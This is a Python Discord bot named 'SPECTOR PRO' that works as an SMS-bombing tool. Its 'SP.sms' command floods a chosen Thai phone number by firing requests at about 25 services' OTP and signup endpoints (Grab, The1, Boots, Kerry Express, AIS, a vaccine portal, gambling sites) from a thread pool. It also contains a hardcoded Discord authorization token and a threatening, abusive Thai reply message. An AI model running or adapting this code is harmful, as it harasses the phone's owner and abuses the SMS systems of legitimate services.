import discord,time
import requests
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading

token = ""



prefix = "SP."

bot = commands.Bot(command_prefix=prefix,help_command=None)
threading = ThreadPoolExecutor(max_workers=int(100000000))
useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
def cang01(phone):
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
def cang02(phone):
    post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
    
def cang03(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
   
   
def cang1(phone):
    post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
    
    
def cang2(phone):
    post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
    
def cang3(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
  "on": {
    "value": phone,
    "country": "66"
  },
  "type": "mobile"
},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 


def cang4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
    
    
def cang5(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
    
def cang6(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})

def cang7(phone):
    post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
    
def cang8(phone):
    post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
    
 
    
def cang9(phone):
    post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
    
def cang10(phone):
    post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
    
def cang11(phone):
    post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
        "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
    
    
    
    
def cang12(phone):
	post("https://discord.com/api/v9/users/@me/phone",json={
  "phone": "+66"+phone,
  "change_phone_reason": "guild_phone_required"
},headers={"authorization":"OTA4MjA2NjE4NjE1OTA2Mzg1.Ycz2Hw.TdQLC2lIwn6UQDl1xBsyJGLnjOw"})


def cang13(phone):
	post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})


def cang13(phone):
	post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	

def cang14(phone):
	post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
	
def cang15(phone):
	post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn",data={"phoneno":phone,

"retrycount":"0"

    },headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def cang16(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def cang17(phone):
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})
     
     
def cang18(phone):
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
    
    

def sck(sphone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":sphone,"password":"1111a1111A","name":sphone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def cang19(phone):
		post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
    
def cang20(phone):
	post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phone,
	})

	
def cang21(phone):
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")

    
def cang22(phone):
	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
	
def cang23(phone):
	 requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile")
	 
def cang24(phone):
	requests.get("https://findclone.ru/register?phone=+66"+phone)

    
    
 
    
def BBot(phone, amount):
    for i in range(amount):
       
        
        
        
        threading.submit(cang01,phone)
        threading.submit(cang02,phone)
        threading.submit(cang03,phone)
        threading.submit(cang1,phone)
        threading.submit(cang2,phone)
        threading.submit(cang3,phone)
        threading.submit(cang3,phone)
        threading.submit(cang4,phone)
        threading.submit(cang5,phone)
        threading.submit(cang6,phone)
        threading.submit(cang7,phone)
        threading.submit(cang8,phone)
        threading.submit(cang9,phone)
        threading.submit(cang10,phone)
        threading.submit(cang11,phone)
        threading.submit(cang12,phone)
        threading.submit(cang13,phone)
        threading.submit(cang14,phone)
        threading.submit(cang15,phone)
        threading.submit(cang16,phone)
        threading.submit(cang17,phone)
        threading.submit(cang18,phone)
        threading.submit(cang19,phone)
        threading.submit(cang20,phone)        
        threading.submit(cang21,phone)
        threading.submit(cang22,phone)
        threading.submit(cang23,phone)
        threading.submit(cang24,phone)
        
        
        
        
        


        
       
        
        
        
@bot.event
async def on_connect():
    print(f"กำลังล็อกอินบอท : {bot.user}")
    time.sleep(1.0)
    print("ล็อกอินสำเร็จ")
    


    


    
    
    
@bot.command()
async def sms(ctx, phone, amount:int):
    
    if (amount < 151):
    	
      embes = discord.Embed(title="SPAMSMS", description="SPECTOR PRO",color=0xff4612)
      embes.add_field(name="กำลังยิงไปที่เบอร์",value=phone)
      ima = "https://phoneky.co.uk/thumbs/screensavers/down/technology/smsisloadi_aleaqts4.gif"
      embes.set_image(url=ima)
    
      await ctx.channel.send(embed=embes)
    
		
    
      BBot(phone,amount)
    else:
    	await ctx.channel.send("กูบอกว่ายิงไม่เกิน150ไง ไอสัสพวกเหี้ย กูฆ่ามืงแน่")
    


		
		
		
		
		


	
	
    
    
    
    
@bot.command()
async def help(ctx):
	emBed = discord.Embed(title="SPECTOR PRO",description="วิธิใช้",color=0xff4612)
	emBed.add_field(name="SP PRO",value="SP.sms [เบอร์] [จำนวน]")
	
	
	await ctx.channel.send(embed=emBed)
    
    
    
bot.run(token)
